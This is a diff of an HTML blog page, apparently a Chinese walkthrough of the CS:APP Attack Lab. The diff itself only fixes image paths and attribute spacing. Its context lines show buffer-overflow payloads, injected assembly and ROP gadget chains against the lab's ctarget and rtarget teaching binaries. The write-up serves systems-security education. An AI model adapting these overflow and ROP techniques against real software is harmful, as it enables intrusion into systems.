@@ -30,24 +30,24 @@
 <meta property="og:site_name" content="ExiTalk">
 <meta property="og:description" content="CS:APP–Lab assignments #3">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://www.superpung.xyz/Attack-Lab/Attack-Lab/SuperPung_%E5%85%AC%E4%BC%97%E5%8F%B7.png">
-<meta property="og:image" content="https://www.superpung.xyz/Attack-Lab/Attack-Lab/Summary_of_attack_lab_phases.png">
-<meta property="og:image" content="https://www.superpung.xyz/Attack-Lab/Attack-Lab/movq%E6%8C%87%E4%BB%A4%E7%9A%84%E7%BC%96%E7%A0%81.png">
-<meta property="og:image" content="https://www.superpung.xyz/Attack-Lab/Attack-Lab/%E5%9B%BE3A-B.png">
-<meta property="og:image" content="https://www.superpung.xyz/Attack-Lab/Attack-Lab/%E5%9B%BE3B.png">
-<meta property="og:image" content="https://www.superpung.xyz/Attack-Lab/Attack-Lab/%E5%9B%BE3A.png">
-<meta property="og:image" content="https://www.superpung.xyz/Attack-Lab/Attack-Lab/%E5%9B%BE3C-D.png">
-<meta property="og:image" content="https://www.superpung.xyz/Attack-Lab/Attack-Lab/%E5%9B%BE3A.png">
-<meta property="og:image" content="https://www.superpung.xyz/Attack-Lab/Attack-Lab/%E5%9B%BE3A.png">
-<meta property="og:image" content="https://www.superpung.xyz/Attack-Lab/Attack-Lab/%E5%9B%BE3C.png">
-<meta property="og:image" content="https://www.superpung.xyz/Attack-Lab/Attack-Lab/%E5%9B%BE3D.png">
+<meta property="og:image" content="https://www.superpung.xyz/Attack-Lab/SuperPung_%E5%85%AC%E4%BC%97%E5%8F%B7.png">
+<meta property="og:image" content="https://www.superpung.xyz/Attack-Lab/Summary_of_attack_lab_phases.png">
+<meta property="og:image" content="https://www.superpung.xyz/Attack-Lab/movq%E6%8C%87%E4%BB%A4%E7%9A%84%E7%BC%96%E7%A0%81.png">
+<meta property="og:image" content="https://www.superpung.xyz/Attack-Lab/%E5%9B%BE3A-B.png">
+<meta property="og:image" content="https://www.superpung.xyz/Attack-Lab/%E5%9B%BE3B.png">
+<meta property="og:image" content="https://www.superpung.xyz/Attack-Lab/%E5%9B%BE3A.png">
+<meta property="og:image" content="https://www.superpung.xyz/Attack-Lab/%E5%9B%BE3C-D.png">
+<meta property="og:image" content="https://www.superpung.xyz/Attack-Lab/%E5%9B%BE3A.png">
+<meta property="og:image" content="https://www.superpung.xyz/Attack-Lab/%E5%9B%BE3A.png">
+<meta property="og:image" content="https://www.superpung.xyz/Attack-Lab/%E5%9B%BE3C.png">
+<meta property="og:image" content="https://www.superpung.xyz/Attack-Lab/%E5%9B%BE3D.png">
 <meta property="article:published_time" content="2020-05-08T08:49:07.000Z">
 <meta property="article:modified_time" content="2020-06-17T01:19:02.000Z">
 <meta property="article:author" content="SUPER">
 <meta property="article:tag" content="Computer Systems">
 <meta property="article:tag" content="Lab Assignments">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://www.superpung.xyz/Attack-Lab/Attack-Lab/SuperPung_%E5%85%AC%E4%BC%97%E5%8F%B7.png">
+<meta name="twitter:image" content="https://www.superpung.xyz/Attack-Lab/SuperPung_%E5%85%AC%E4%BC%97%E5%8F%B7.png">
 
 
 <link rel="canonical" href="https://www.superpung.xyz/Attack-Lab/">
@@ -352,7 +352,7 @@
         <p>CS:APP–Lab assignments #3</p>
 <a id="more"></a>
 
-<p><img src="Attack-Lab/SuperPung_%E5%85%AC%E4%BC%97%E5%8F%B7.png" alt="SuperPung_公众号"></p>
+<p><img src="/Attack-Lab/SuperPung_%E5%85%AC%E4%BC%97%E5%8F%B7.png" alt="SuperPung_公众号"></p>
 <p><strong><em>若参考或转载请注明出处</em></strong></p>
 <p>本实验通过代码注入攻击、<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/zh-cn/%E8%BF%94%E5%9B%9E%E5%AF%BC%E5%90%91%E7%BC%96%E7%A8%8B">面向返回编程（Return-Oriented Programming，ROP）</a>攻击来帮助理解缓冲区溢出的危害。你将研究CS:APP3e的第3.10.3和3.10.4节，作为该实验的参考资料。</p>
 <p>注意：</p>
@@ -397,7 +397,7 @@
 </li>
 </ul>
 <p><em>若完成课程要求部分，则只需用到 <code>ctarget</code>、<code>cookie.txt</code>和<code>hex2raw</code>。</em></p>
-<p>下图总结了实验的五个阶段。可以看出，前三个涉及对<code>catrget</code>的代码注入（CI）攻击（课程要求），而后两个涉及对<code>rtarget</code>的面向返回编程（ROP）攻击（课程未做要求）。<img src="Attack-Lab/Summary_of_attack_lab_phases.png" alt="Summary_of_attack_lab_phases"></p>
+<p>下图总结了实验的五个阶段。可以看出，前三个涉及对<code>catrget</code>的代码注入（CI）攻击（课程要求），而后两个涉及对<code>rtarget</code>的面向返回编程（ROP）攻击（课程未做要求）。<img src="/Attack-Lab/Summary_of_attack_lab_phases.png" alt="Summary_of_attack_lab_phases"></p>
 <p><code>ctarget</code>和<code>rtarget</code>都从标准输入读取字符串，二者都采用几个不同的命令行参数：</p>
 <ul>
 <li><code>-h</code>：打印可能的命令行参数列表</li>
@@ -445,7 +445,7 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">00000000004017c0 &lt;touch1&gt;:</span><br><span class="line">  ...</span><br></pre></td></tr></table></figure>
 <p>可以看到<code>touch1</code>函数的地址为<code>0x4017c0</code>，这就是我们要输入的字符串末尾的字符。</p>
 <hr>
-<p><span id = "hex2rawq"><a href="#hex2raw">如何得到我们要输入的字符串？</a></span></p>
+<p><span id="hex2rawq"><a href="#hex2raw">如何得到我们要输入的字符串？</a></span></p>
 <p>首先编辑用于攻击的字符串文件<code>exploit.txt</code>，同时注意<strong>机器为小端法（little endian）时地址的字节序问题</strong>（前40个字符任意输入）：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">c0 17 40 00 00 00 00 00 /* address of touch1 */</span><br></pre></td></tr></table></figure>
 <p>再将保存的<code>exploit.txt</code>输入到<code>ctarget</code>：</p>
@@ -480,7 +480,7 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov    $0x59b997fa,%rdi    # cookie</span><br><span class="line">push   $0x4017ec           # touch2</span><br><span class="line">ret</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <p>先传入<code>cookie</code>值，再将<code>touch2</code>地址压入栈中，执行<code>ret</code>时弹栈返回。由于栈的后进先出特点，返回地址即为后压入栈中的<code>0x4017ec</code>。</p>
 <hr>
-<p><span id ="generateq"><a href="#generate">如何将汇编代码转换成字节码（机器码）？</a></span></p>
+<p><span id="generateq"><a href="#generate">如何将汇编代码转换成字节码（机器码）？</a></span></p>
 <p>将<code>touch2.s</code>文件进行汇编：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -c touch2.s</span><br></pre></td></tr></table></figure>
 <p>反汇编：</p>
@@ -562,7 +562,7 @@
 <p>得到输出如下：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:Touch3!: You called touch3(&quot;59b997fa&quot;)</span><br><span class="line">Valid solution for level 3 with target ctarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">        user id bovik</span><br><span class="line">        course  15213-f15</span><br><span class="line">        lab     attacklab</span><br><span class="line">        result  1:PASS:0xffffffff:ctarget:3:48 C7 C7 A8 DC 61 55 68 FA 18 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 35 39 62 39 39 37 66 61 00 </span><br></pre></td></tr></table></figure>
 <p>完成。</p>
-<h2 id="Using-hex2raw"><a href="#Using-hex2raw" class="headerlink" title="Using hex2raw"></a><span id = "hex2raw">Using <code>hex2raw</code></span></h2><p><code>hex2raw</code>将十六进制格式的字符串作为输入。在这种格式下，每个字节值由两个十六进制数字表示。 例如，字符串“<code>012345</code>”可以十六进制格式输入为“<code>30 31 32 33 34 35 00</code>”。（请记住，十进制数字<code>X</code>的ASCII码为<code>0x3X</code>，并且字符串的结尾由空字节指示。）</p>
+<h2 id="Using-hex2raw"><a href="#Using-hex2raw" class="headerlink" title="Using hex2raw"></a><span id="hex2raw">Using <code>hex2raw</code></span></h2><p><code>hex2raw</code>将十六进制格式的字符串作为输入。在这种格式下，每个字节值由两个十六进制数字表示。 例如，字符串“<code>012345</code>”可以十六进制格式输入为“<code>30 31 32 33 34 35 00</code>”。（请记住，十进制数字<code>X</code>的ASCII码为<code>0x3X</code>，并且字符串的结尾由空字节指示。）</p>
 <p>传递给<code>hex2raw</code>的十六进制字符应由空格（空格或换行符）分隔。我们建议你在处理字符串的不同部分使用换行符分隔。 <code>hex2raw</code>支持C样式的块注释，因此你可以标记字符串的各个部分（<strong>确保在开始和结束注释字符串（“<code>/*</code> ”，“<code>*/</code>”）周围都留有空格，以便注释被忽略</strong>）。</p>
 <p>如果在文件<code>exploit.txt</code>中生成了十六进制格式的字符串，则可以通过几种不同方式将原始字符串应用于<code>ctarget</code>或<code>rtarget</code>：</p>
 <ol>
@@ -578,7 +578,7 @@
 </li>
 </ol>
 <p><a href="#hex2rawq">点此返回</a></p>
-<h2 id="Generating-Byte-Codes"><a href="#Generating-Byte-Codes" class="headerlink" title="Generating Byte Codes"></a><span id = "generate">Generating Byte Codes</span></h2><p>将<code>gcc</code>用作汇编器，将<code>objdump</code>用作反汇编器，可以方便地生成指令序列的字节码。例如，假设你编写的文件<code>example.s</code>包含以下汇编代码：</p>
+<h2 id="Generating-Byte-Codes"><a href="#Generating-Byte-Codes" class="headerlink" title="Generating Byte Codes"></a><span id="generate">Generating Byte Codes</span></h2><p>将<code>gcc</code>用作汇编器，将<code>objdump</code>用作反汇编器，可以方便地生成指令序列的字节码。例如，假设你编写的文件<code>example.s</code>包含以下汇编代码：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># Example of hand-generated assembly code</span><br><span class="line">  pushq   $0xabcdef    # Push value onto stack</span><br><span class="line">  addq    $17,%rax     # Add 17 to %rax</span><br><span class="line">  movl    %eax,%edx    # Copy lower 32 bits to %edx</span><br></pre></td></tr></table></figure>
 <p>此代码可以包含指令和数据的混合。“<code>＃</code>”字符右侧的任何内容均为注释。</p>
 <p>你现在可以汇编和反汇编此文件：</p>
@@ -610,7 +610,7 @@
 <p>此功能对攻击系统有用的机会似乎很小。 但是，此功能的反汇编机器码显示了一个有趣的字节序列：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">0000000000400f15 &lt;setval_210&gt;:</span><br><span class="line">  400f15: c7 07 d4 48 89 c7    movl $0xc78948d4,(%rdi)</span><br><span class="line">  400f1b: c3    retq</span><br></pre></td></tr></table></figure>
 
-<p>字节序列<code>48 89 c7</code>对指令<code>movq ％rax，％rdi</code>进行编码。 （有关有用的movq指令的编码，请参见下图。）<img src="Attack-Lab/movq%E6%8C%87%E4%BB%A4%E7%9A%84%E7%BC%96%E7%A0%81.png" alt="movq指令的编码">此序列后跟字节值<code>c3</code>，该字节值对<code>ret</code>指令进行编码。 该函数从地址<code>0x400f15</code>开始，序列从该函数的第四个字节开始。 因此，该代码包含一个起始地址为<code>0x400f18</code>的<code>gadget</code>，该<code>gadget</code>会将寄存器<code>％rax</code>中的64位值复制到寄存器<code>％rdi</code>。</p>
+<p>字节序列<code>48 89 c7</code>对指令<code>movq ％rax，％rdi</code>进行编码。 （有关有用的movq指令的编码，请参见下图。）<img src="/Attack-Lab/movq%E6%8C%87%E4%BB%A4%E7%9A%84%E7%BC%96%E7%A0%81.png" alt="movq指令的编码">此序列后跟字节值<code>c3</code>，该字节值对<code>ret</code>指令进行编码。 该函数从地址<code>0x400f15</code>开始，序列从该函数的第四个字节开始。 因此，该代码包含一个起始地址为<code>0x400f18</code>的<code>gadget</code>，该<code>gadget</code>会将寄存器<code>％rax</code>中的64位值复制到寄存器<code>％rdi</code>。</p>
 <p><code>rtarget</code>的代码在我们称为<code>gadget farm</code>的区域中包含许多与上面显示的<code>setval_210</code>函数相似的函数。 你的工作将是识别<code>gadget farm</code>中的有用<code>gadget</code>，并使用它们执行与<code>level 2</code>和<code>level 3</code>中类似的攻击。</p>
 <p>重要提示：<code>gadget farm</code>在<code>rtarget</code>副本中由函数<code>start_farm</code>和<code>end_farm</code>划分。 请勿尝试从程序代码的其他部分构造<code>gadget</code>。</p>
 </blockquote>
@@ -618,7 +618,7 @@
 <p>反汇编：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -d rtarget &gt; rtarget.s</span><br></pre></td></tr></table></figure>
 <h2 id="Level-4"><a href="#Level-4" class="headerlink" title="Level 4"></a>Level 4</h2><blockquote>
-<p>对于<code>level 4</code>，你将重复<code>level 2</code>的攻击，但是使用<code>gadget farm</code>中的<code>gadget</code>在<code>rtarget</code>上进行此操作。 你可以使用由以下指令类型组成的<code>gadget</code>并仅使用前八个x86-64寄存器（<code>％rax</code>–<code>％rdi</code>）来构建解决方案。<br><code>movq</code>：这些代码在下图A中显示。<br><code>popq</code>：这些代码在下图B中显示。<img src="Attack-Lab/%E5%9B%BE3A-B.png" alt="图3A-B"><br><code>ret</code>：该指令由单字节<code>0xc3</code>编码。<br><code>nop</code>：该指令（发音为“ no op”，缩写为“ no operation”）由单字节<code>0x90</code>编码。 唯一的作用是使程序计数器加1。</p>
+<p>对于<code>level 4</code>，你将重复<code>level 2</code>的攻击，但是使用<code>gadget farm</code>中的<code>gadget</code>在<code>rtarget</code>上进行此操作。 你可以使用由以下指令类型组成的<code>gadget</code>并仅使用前八个x86-64寄存器（<code>％rax</code>–<code>％rdi</code>）来构建解决方案。<br><code>movq</code>：这些代码在下图A中显示。<br><code>popq</code>：这些代码在下图B中显示。<img src="/Attack-Lab/%E5%9B%BE3A-B.png" alt="图3A-B"><br><code>ret</code>：该指令由单字节<code>0xc3</code>编码。<br><code>nop</code>：该指令（发音为“ no op”，缩写为“ no operation”）由单字节<code>0x90</code>编码。 唯一的作用是使程序计数器加1。</p>
 <p>一些忠告：</p>
 <ul>
 <li>你所需的所有<code>gadget</code>都可以在函数<code>start_farm</code>和<code>mid_farm</code>划定的<code>rtarget</code>的代码区域中找到。</li>
@@ -632,14 +632,14 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov    $0x59b997fa,%rdi    # cookie</span><br><span class="line">push   $0x4017ec           # touch2</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
 <p>思路是先将<code>cookie</code>值传入<code>%rdi</code>，再跳转到<code>touch2</code>地址即可。</p>
 <hr>
-<p>现在不可以直接将一个特定立即数传给某寄存器，所以先将此立即数保存在栈中，再<code>pop</code>到指定寄存器。<img src="Attack-Lab/%E5%9B%BE3B.png" alt="图3B"></p>
+<p>现在不可以直接将一个特定立即数传给某寄存器，所以先将此立即数保存在栈中，再<code>pop</code>到指定寄存器。<img src="/Attack-Lab/%E5%9B%BE3B.png" alt="图3B"></p>
 <p>观察上图，并寻找含有<code>58</code>～<code>5f</code>的语句：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00000000004019a7 &lt;addval_219&gt;:</span><br><span class="line">  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax</span><br><span class="line">  4019ad:	c3                   	retq</span><br></pre></td></tr></table></figure>
 <p>此处的<code>58 90 c3</code>对应：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">popq    %rax</span><br><span class="line">nop</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
 <p>我们找到了可以<code>pop</code>到<code>%rax</code>寄存器的指令，地址为<code>4019a7+4=4019ab</code>。</p>
 <hr>
-<p>然后我们寻找可以实现<code>%rax</code>-&gt;…-&gt;<code>%rdi</code>的指令。<img src="Attack-Lab/%E5%9B%BE3A.png" alt="图3A"></p>
+<p>然后我们寻找可以实现<code>%rax</code>-&gt;…-&gt;<code>%rdi</code>的指令。<img src="/Attack-Lab/%E5%9B%BE3A.png" alt="图3A"></p>
 <p>观察上图，如果有<code>48 89 c7</code>最好，如果没有则需要多传递几次。寻找结果：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00000000004019a0 &lt;addval_273&gt;:</span><br><span class="line">  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax</span><br><span class="line">  4019a6:	c3                   	retq  </span><br></pre></td></tr></table></figure>
 <p>此处的<code>48 89 c7 c3</code>对应：</p>
@@ -660,7 +660,7 @@
 <h2 id="Level-5"><a href="#Level-5" class="headerlink" title="Level 5"></a>Level 5</h2><blockquote>
 <p>在进行<code>level 5</code>之前，请暂停思考你到目前为止已完成的工作。在<code>level 2</code>和<code>level 3</code>中，你使程序执行自己设计的机器代码。如果<code>ctarget</code>曾经是网络服务器，则可以将自己的代码注入到远程计算机中。在<code>level 4</code>中，你规避了现代系统用来阻止缓冲区溢出攻击的两个主要设备。尽管你没有注入自己的代码，但是你仍然可以注入一种程序，该程序通过将现有代码序列拼接在一起来运行。你还为此实验获得了95/100分。这是一个很好的成绩。如果你还有其他紧迫的任务，请考虑立即停止。</p>
 <p><code>level 5</code>要求你对<code>rtarget</code>进行ROP攻击，以使用指向<code>cookie</code>字符串表示形式的指针来调用函数<code>touch3</code>。除了使用ROP攻击来调用<code>touch2</code>之外，这似乎似乎没有那么困难。此外，第5阶段仅计5分，这并不是衡量其所需努力的真实指标。对于那些想要超越课程正常期望的人，将其视为额外的学分问题。</p>
-<p>要解决<code>level 5</code>，可以在函数<code>rstart_farm</code>和<code>end_farm</code>划分的<code>rtarget</code>中的代码区域中使用<code>gadget</code>。 除了在<code>levle 4</code>中使用的<code>gadget</code>之外，此扩展服务器场还包括不同<code>movl</code>指令的编码，如下图C所示。 服务器场此部分中的字节序列还包含2字节指令，这些指令用作功能上的<code>nop</code>，即它们不更改任何寄存器或内存值。这些指令包括下图D中所示的指令，例如<code>andb ％al，％al</code>，它们在某些寄存器的低位字节上运行，但不更改其值。<img src="Attack-Lab/%E5%9B%BE3C-D.png" alt="图3C-D"></p>
+<p>要解决<code>level 5</code>，可以在函数<code>rstart_farm</code>和<code>end_farm</code>划分的<code>rtarget</code>中的代码区域中使用<code>gadget</code>。 除了在<code>levle 4</code>中使用的<code>gadget</code>之外，此扩展服务器场还包括不同<code>movl</code>指令的编码，如下图C所示。 服务器场此部分中的字节序列还包含2字节指令，这些指令用作功能上的<code>nop</code>，即它们不更改任何寄存器或内存值。这些指令包括下图D中所示的指令，例如<code>andb ％al，％al</code>，它们在某些寄存器的低位字节上运行，但不更改其值。<img src="/Attack-Lab/%E5%9B%BE3C-D.png" alt="图3C-D"></p>
 <p>一些忠告：</p>
 <ul>
 <li>你需要查看<code>movl</code>指令对寄存器的高4位字节的影响。</li>
@@ -673,7 +673,7 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov    $0x5561dca8,%rdi    # string</span><br><span class="line">push   $0x4018fa           # touch3</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
 <p>思路是先将<code>cookie</code>字符串的地址传入<code>%rdi</code>，再跳转到<code>touch3</code>地址即可。</p>
 <hr>
-<p>但此时栈地址是随机化的，导致我们无法直接获取字符串的地址。根据<code>level 4</code>的经验，我们需要从<code>gadget farm</code>中找到一个能将<code>%rsp</code>传出来的<code>gadget</code>。<img src="Attack-Lab/%E5%9B%BE3A.png" alt="图3A"></p>
+<p>但此时栈地址是随机化的，导致我们无法直接获取字符串的地址。根据<code>level 4</code>的经验，我们需要从<code>gadget farm</code>中找到一个能将<code>%rsp</code>传出来的<code>gadget</code>。<img src="/Attack-Lab/%E5%9B%BE3A.png" alt="图3A"></p>
 <p>观察上图，并寻找含有<code>48 89 e0</code>～<code>48 89 e7</code>的语句：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0000000000401a03 &lt;addval_190&gt;:</span><br><span class="line">  401a03:	8d 87 41 48 89 e0    	lea    -0x1f76b7bf(%rdi),%eax</span><br><span class="line">  401a09:	c3                   	retq  </span><br></pre></td></tr></table></figure>
 <p>此处的<code>48 89 e0 c3</code>对应：</p>
@@ -702,9 +702,9 @@
 </ul>
 <p>总之，现在需要一种（或多种组合）将<code>%rax</code>赋给<code>%rsi</code>的<code>gadget</code>。</p>
 <hr>
-<p><img src="Attack-Lab/%E5%9B%BE3A.png" alt="图3A"></p>
-<p><img src="Attack-Lab/%E5%9B%BE3C.png" alt="图3C"></p>
-<p><img src="Attack-Lab/%E5%9B%BE3D.png" alt="图3D"></p>
+<p><img src="/Attack-Lab/%E5%9B%BE3A.png" alt="图3A"></p>
+<p><img src="/Attack-Lab/%E5%9B%BE3C.png" alt="图3C"></p>
+<p><img src="/Attack-Lab/%E5%9B%BE3D.png" alt="图3D"></p>
 <p>观察以上三图，寻找含有<code>89 c6</code>（<code>%eax</code>-&gt;<code>%esi</code>）的语句，遗憾的是并没有。</p>
 <p>再寻找含有<code>89 c0</code>～<code>89 c7</code>（<code>%eax</code>-&gt;）的语句：</p>
 <ul>
